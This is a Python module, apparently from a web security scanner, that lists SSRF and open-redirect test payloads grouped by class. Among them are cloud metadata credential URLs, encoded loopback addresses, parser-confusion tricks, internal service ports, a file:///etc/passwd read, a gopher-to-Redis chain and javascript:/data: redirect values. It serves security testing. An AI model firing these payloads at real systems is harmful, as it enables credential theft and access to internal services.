"""Payload catalog for lleap.

Each payload is a value meant to be substituted into a URL parameter of
the application under test (for example ``/fetch?url={payload}`` or
``/redirect?next={payload}``). Payloads are grouped so a scan can focus on
one attack class at a time.

The catalog only uses addresses that are meaningful on the machine running
the target: loopback, link-local cloud metadata addresses, and alternate
encodings of 127.0.0.1. Nothing here points at a real third-party host, so
a scan against the bundled lab server never touches the public internet.
"""

from __future__ import annotations

from dataclasses import dataclass


@dataclass(frozen=True)
class Payload:
    """One test value plus the group it belongs to."""

    value: str
    group: str
    note: str


def _p(value: str, group: str, note: str) -> Payload:
    return Payload(value=value, group=group, note=note)


PAYLOADS: tuple[Payload, ...] = (
    # --- Cloud metadata endpoints -------------------------------------
    _p("http://169.254.169.254/latest/meta-data/",
       "metadata", "AWS instance metadata (link-local)"),
    _p("http://169.254.169.254/latest/meta-data/iam/security-credentials/",
       "metadata", "AWS IAM credentials path"),
    _p("http://metadata.google.internal/computeMetadata/v1/",
       "metadata", "GCP metadata server hostname"),
    _p("http://100.100.100.100/latest/meta-data/",
       "metadata", "Alibaba Cloud metadata server"),
    _p("http://169.254.170.2/v2/credentials",
       "metadata", "ECS task metadata endpoint"),
    _p("http://[fd00:ec2::254]/latest/meta-data/",
       "metadata", "AWS metadata over IPv6"),
    # --- Loopback, plain and encoded ----------------------------------
    _p("http://127.0.0.1/", "localhost", "Loopback, dotted decimal"),
    _p("http://localhost/", "localhost", "Loopback, hostname"),
    _p("http://localhost:80/", "localhost", "Loopback, explicit port 80"),
    _p("http://0.0.0.0/", "localhost", "Wildcard address (often routes to loopback)"),
    _p("http://[::1]/", "localhost", "Loopback, IPv6"),
    _p("http://2130706433/", "localhost", "127.0.0.1 as a single decimal integer"),
    _p("http://0x7f000001/", "localhost", "127.0.0.1 as hex"),
    _p("http://017700000001/", "localhost", "127.0.0.1 as octal"),
    _p("http://127.1/", "localhost", "127.0.0.1, shortened form"),
    _p("http://127.0.0.1%09/", "localhost", "127.0.0.1 with trailing tab (parser confusion)"),
    # --- Parser-confusion: userinfo / fragment tricks ------------------
    _p("http://trusted.example.com@127.0.0.1/",
       "parser", "Userinfo trick: host looks like trusted.example.com"),
    _p("http://127.0.0.1%23@trusted.example.com/",
       "parser", "Fragment trick: naive validators see trusted.example.com"),
    _p("http://127.0.0.1%09@trusted.example.com/",
       "parser", "Tab inside authority (parser confusion)"),
    _p("http://trusted.example.com%2f@127.0.0.1/",
       "parser", "Encoded slash before the real host"),
    # --- Internal services on loopback ---------------------------------
    _p("http://127.0.0.1:6379/", "internal", "Redis default port"),
    _p("http://127.0.0.1:3306/", "internal", "MySQL default port"),
    _p("http://127.0.0.1:5432/", "internal", "PostgreSQL default port"),
    _p("http://127.0.0.1:27017/", "internal", "MongoDB default port"),
    _p("http://127.0.0.1:9200/", "internal", "Elasticsearch default port"),
    _p("http://127.0.0.1:2375/version", "internal", "Docker daemon API (unauthenticated)"),
    _p("http://127.0.0.1:8080/admin", "internal", "Common admin path on loopback"),
    _p("http://127.0.0.1:9000/", "internal", "PHP-FPM / misc service port"),
    # --- Non-HTTP schemes ----------------------------------------------
    _p("file:///etc/passwd", "scheme", "Local file read via file://"),
    _p("gopher://127.0.0.1:6379/_INFO", "scheme", "Gopher to Redis (classic SSRF chain)"),
    _p("dict://127.0.0.1:6379/INFO", "scheme", "dict:// to Redis"),
    _p("ftp://127.0.0.1/", "scheme", "FTP to loopback"),
    # --- Open redirect --------------------------------------------------
    _p("https://evil.example.com/", "redirect", "Absolute external URL"),
    _p("//evil.example.com/", "redirect", "Protocol-relative URL"),
    _p("/%2fevil.example.com/", "redirect", "Encoded double slash"),
    _p("https:evil.example.com", "redirect", "Missing slashes after scheme"),
    _p("https://evil.example.com%2f..%2f", "redirect", "Encoded path after external host"),
    _p("javascript:alert(1)", "redirect", "javascript: scheme (must never execute)"),
    _p("data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
       "redirect", "data: scheme carrying HTML"),
)

GROUPS: tuple[str, ...] = (
    "metadata", "localhost", "parser", "internal", "scheme", "redirect",
)


def payloads_for(groups: tuple[str, ...] | None = None) -> list[Payload]:
    """Return payloads filtered to ``groups`` (all of them when None)."""
    if groups is None:
        return list(PAYLOADS)
    wanted = set(groups)
    unknown = wanted - set(GROUPS)
    if unknown:
        raise ValueError(f"unknown payload group(s): {', '.join(sorted(unknown))}")
    return [p for p in PAYLOADS if p.group in wanted]
